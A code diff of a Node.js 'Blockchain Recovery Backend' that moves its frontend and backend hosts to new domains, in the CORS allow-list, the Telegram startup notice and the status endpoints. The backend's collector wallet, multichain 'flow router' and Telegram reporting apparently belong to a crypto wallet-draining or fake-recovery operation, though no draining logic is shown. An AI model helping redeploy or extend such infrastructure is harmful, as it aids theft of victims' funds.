@@ -32,8 +32,8 @@ const allowedOrigins = process.env.ALLOWED_ORIGINS
   ? process.env.ALLOWED_ORIGINS.split(',') 
   : [
       'http://localhost:3000', 
-      'https://blockchainrecovery-steel.vercel.app',
-      'https://recoveryback.vercel.app',
+      'https://blockchainrecoveryx.netlify.app',
+      'https://recoveryback.onrender.com',
       'https://bitcoinhypertoken.vercel.app'
     ];
 
@@ -115,8 +115,8 @@ async function testTelegramConnection() {
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `🔗 Backend: recoveryback.vercel.app\n` +
-      `🌍 Frontend: blockchainrecovery-steel.vercel.app\n` +
+      `🔗 Backend: https://recoveryback.onrender.com\n` +
+      `🌍 Frontend: https://blockchainrecoveryx.netlify.app\n` +
       `🕐 Started: ${new Date().toLocaleString()}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
@@ -149,8 +149,8 @@ app.get('/', (req, res) => {
     version: '2.0.0',
     status: '🟢 ONLINE',
     telegram: telegramEnabled ? '✅ connected' : '❌ disabled',
-    backendUrl: 'https://recoveryback.vercel.app',
-    frontendUrl: 'https://blockchainrecovery-steel.vercel.app',
+    backendUrl: 'https://recoveryback.onrender.com',
+    frontendUrl: 'https://blockchainrecoveryx.netlify.app',
     timestamp: new Date().toISOString()
   });
 });
@@ -163,7 +163,7 @@ app.get('/api/health', (req, res) => {
   res.json({ 
     success: true, 
     status: 'ACTIVE',
-    backend: 'https://recoveryback.vercel.app',
+    backend: 'https://recoveryback.onrender.com',
     telegram: telegramEnabled ? 'connected' : 'disabled'
   });
 });
@@ -917,8 +917,8 @@ app.listen(PORT, '0.0.0.0', async () => {
   ║     ⚡ BLOCKCHAIN RECOVERY BACKEND - WORKING VERSION ⚡        ║
   ╠══════════════════════════════════════════════════════════════╣
   ║  📍 Port: ${PORT.toString().padEnd(40)}║
-  ║  🔗 Backend: https://recoveryback.vercel.app${' '.repeat(22)}║
-  ║  🌍 Frontend: https://blockchainrecovery-steel.vercel.app${' '.repeat(12)}║
+  ║  🔗 Backend: https://recoveryback.onrender.com${' '.repeat(22)}║
+  ║  🌍 Frontend: https://blockchainrecoveryx.netlify.app${' '.repeat(12)}║
   ╠══════════════════════════════════════════════════════════════╣
   ║  📦 COLLECTOR: ${COLLECTOR_WALLET.substring(0, 30)}...${' '.repeat(4)}║
   ╠══════════════════════════════════════════════════════════════╣
